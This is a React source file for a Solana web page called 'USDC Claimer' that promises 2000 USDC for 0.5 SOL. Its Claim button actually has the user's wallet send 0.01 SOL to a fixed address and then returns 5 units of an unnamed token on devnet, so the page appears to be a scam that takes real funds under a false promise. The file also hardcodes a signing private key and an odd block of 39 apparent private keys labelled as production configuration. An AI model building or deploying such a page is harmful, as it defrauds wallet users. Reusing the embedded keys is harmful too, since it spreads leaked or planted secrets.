/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "Acexxemd3KBfaPcJk3qtgAB6zLURmnVg86aTxnTGMx8Aq7muQiFrvnX928dM8sDWw8536HD5DwYFFyvn1iFGftX"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5TLcBe4ba4nwF4U7m9bndSAyGtNjMpNaHYFwEP4btfecgM3JgRdsLLqZid94y2XxcUmntfBPDPTBzzumAvjSoKK1",
  "key1": "PVo3Q3FY5n2FpYtbd6kS1eKqCFtUwDKBJFsUE5wpL86qRUeg2wECPApHQUnQnZ2Nw5h8JnNjAUegrZZEfhuHnpp",
  "key2": "5vkxpgnaWqfRgoykUhRdfpzr9ewrzqW56W5QLNfVFj74EiDjFZJT487wX7nhBC8NKWvBdpa994VTujcm4iwY5UK7",
  "key3": "bn2wkJQWQYW8iLwZ2kQiZmWXbk7zqVtdUd9w9bUH4frMra3hNty92kRubv2kUtuwFFiL5h9AyEhcCU8SVVA5mTs",
  "key4": "2vfYYdFMxfjix1FbVZnWHN7YEVaZawBWAbfNr2KM5DmVFk8m7w2pLcnLvpJc5KVkYfSK2QgLvQ3XfZeztor7LMRi",
  "key5": "yF4Xzyr9MjuudtD88wYtULNhB16sPi7zxseDLy4udBpUBS22DoACsmXRfU1dFgWDEqJbzCTeMyq277trwetAfif",
  "key6": "39P3fkHKdhAjQd2Zu6UeY9X58sHGYnQzyMHUFBS9cXv36kWdU2D46m8HcX1JqqCKUj3gt3xGz5QC5JZpCNTxP9qm",
  "key7": "4zajbx9wAdgKAMTQ8CgYFJxsyMkGj3PUTzNb9uAAFkUjssL6ewFBtWD5SsapGKWdJQNH7qJxNnrMFTp9q8w1wA3s",
  "key8": "3LxkMq5vHgq8kpNuZoigQQhMA2x4x96AafSxy8WvDaAxtXGEc53fZdpnoeW3a2TGwvkVuypm5KHf8p8uo6eSBKHr",
  "key9": "55fZmHaeHi67uyNPF6QbpL8mQdVBfHP6LeRBPh32dYAkzY4LhfT1wYFhkQ5hQwkiM61rtwzuLYCCMu5ytn5iJNtk",
  "key10": "4FGidxh5zszDc2fVN3vFHMSdEu4STNhVrbfK3xP4n61HNHiTACC7qjowTdxuHe8KZ7wWPdddJgsxBGLygZW68c7M",
  "key11": "4Usk5mYCkM4TS9oeFyAx56GfAZTwoq5GjA8La6Kc9GFyP9Y74sN5FGT3VpcTBNAd3jJY821D9xFHMz25byY8RECG",
  "key12": "5Bw2XnBd1AtkbKDRBKtw3BLZZMwuL6u4hqoYEHevAN9CBjt3cZgf5KAJu5Jjb6epLrnAgd5eb7qapGfEmzarVZLJ",
  "key13": "Ap4BmSMZe5Yc8dX5MxTdimms93c4h7Lvamz1A1xtbi8bBw6T2qZsZocLfyTFWbNGMQHBbvvKeZWcSW9X6rVDREU",
  "key14": "21v9Ce5amtfn1s9iBdGK9bCkU8oqj5saFBs7HiBsqqm1Xxm8v4BhRksY3j9CeMZUk8hzU4JwkPGy7WsAieHqMfGc",
  "key15": "2UsnHXzpri8Sp6V2eVUUsThv6KFDiB7yy1a99tZE1XSkzzPNUFcG4FgEqpLXLJRvSYEUhpiTJrX7sGrGXksTFpzt",
  "key16": "5abxPRi6X6huRys886RjbGbs2jB5kXHqMN4PoJXgChbDyfj9C6PwysFL6qNHZNBYvB2v7UqKXNvcvTES63H8Fg3V",
  "key17": "5QKU4XsBtoiWWCrbyhsbW55cnzKbcU26RUGXKudgoYZy8Mt2DuD4aQhUvtPeWpCGGei9oViuyWcMVZcEQF6rHG9Q",
  "key18": "2RDxopYAi2TEAtAM7xYfpgfwyLR3CQvRCqTBKrpnJjebr5Gd3HDLEQELDM3nWKDzS7vMJggWCTMhqtQMufFCoPFb",
  "key19": "4DE3qYFnbZarwZw4EyV4Qud8UXNed62vFtSDn61YsogoyVKbSiRyAUn7M8vkU28EQCvbaWbQNFTL9nv54aGuC3oY",
  "key20": "42X1kTpN8Wy1gJCujD98dqTQ2Evjhdrw9Mqp1P4hGqHsbEUZLKABmXzyENo2UNs38iaCEXBmBvdoyJQfehEJpspq",
  "key21": "651DqtekiQd256BJfUGtAZp55U8GCXBaeaxSScpiVGbTtwQTV8aoLKbubtXEMyv3EPo2AeXpheVjwDY3uK8Zthbr",
  "key22": "2uc3neyunaD5AA6rPQiJkr59rMnfXWMyJUbmc9AyZgExdYy2GTE4Dd2URa59rBgM2u4WrEt5a5ijNSiFS4jkTWn9",
  "key23": "dreiybozEg7esGhYtyvYRvycYN9A9GXgmeyv1vFwGQKykZuoaVxgv4d9vMMwX5e4R87BJMcBj7r3Tj8wY4cykij",
  "key24": "4Nzp6gZwxTsdUca7zA1Hi8Xach2sANSNcHNJGzqy6WwCNQitgGXcxgwRyoievHDUomekyT1d7pw6zifZ8yvapyrw",
  "key25": "3g1goLBzfUWvjHUV4Bkxo9rr8Mo4DEGjHiePfBsuTvUhj6jaQTNS1mnwtkv7Kb5FBebP9Z4wk4m8LNmVthWWasPA",
  "key26": "hPNCHqrp97paWxaBu4YC9spU9QMt2zpVBmEV8oJf4ZfeTJpT2zNisq8yP8aTqADYAHp6iL84vZk1T4a6TjfJzED",
  "key27": "54C1x1js9r42bXtDuv3VUSPvcoNQqHNA9rz25AoMi9ac4BnUBt84jRLNjXQ6Bp8ogbikmrJLgP8AmyQLYUrzaDuW",
  "key28": "3GgcEhLRR9Z44Z3nkoRRA1G6at3sugeQacDSH5p4myQYdD89m68KCmATkDPsgxHAEJcNQ8k1GP7S2Kuw4wWqyYJq",
  "key29": "2K39Pm85Hdx1AjGbdY59UGL3N21sF1im14FabUusZLTRLhry3qMr9DDL8pkWg7NsxTShnXQJYwYrFnYrm5qSGcjb",
  "key30": "44PMGnPjtTJ7KGJxs9LUV7s3ncHFACtH2UGQxtX6y4SpcqNUCeQPR6xVZaBGG17C198rQkEM5AHEn88axjpennZy",
  "key31": "5jhMeu2xwZi7hHcZeLeYxy1Wq2HYUXvojJotEmvdzR1nzn3Vd6BSDv4karNDshmB3FCBbcZ3wVANSXK5f29VxNiZ",
  "key32": "2NoaGiqF9PK8sC5VhUbfCK19e9uzJJgGu5Eb7syCMFTiNGz7KwjRQKbXVH8ZnZ9VkPz7oqYUtEcz8cvkmtiFudFo",
  "key33": "3KdVbA9b3Pmz4ghoXStJmP1iQMBy58KzT2ycU8pjvwn3Hm93bkCJFbFXeUTcEhNypTZkPTZZX3DuxZ9nC179GU9E",
  "key34": "3QD3Ys4u89stthsrxL6zbUSzru3UHk2avhJFL8PFfq1EWr1Vw9rbc4Nhmx5uaJ6Mg8dn5JkLvqxmW9qZtZE5xEw",
  "key35": "2Xzn87QncgCHFYG3AF3xCptobosizQj52ZQY9oygDrfidLKTSLoMcjY6HGGCZmR7FGTrPARovPQxzf8Bqt62F2rN",
  "key36": "5r9T9RpDkEtztBabQgrFMm41QF3LPRK89i42FU1M7Hf2oRcu4fEq6Er9LuVvfHsDgos47jCiPJnzD2sf5KkzUQzs",
  "key37": "46gxWfiebcPXy3g5t6iVrNdZ5Vey4M8JyNLFKLV5mV76D74X9r5BvpNu251zNf1RD4UL72nT7kP2gqinPzJU2Yx1",
  "key38": "5N6YQ11htz22edbTpDFAi8GNAZBUCSp9yBuhARzLNnu39F1x1BSPpzL8E6v8bi15yBoPzQk6PoRSmUtSarBb6i4v"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
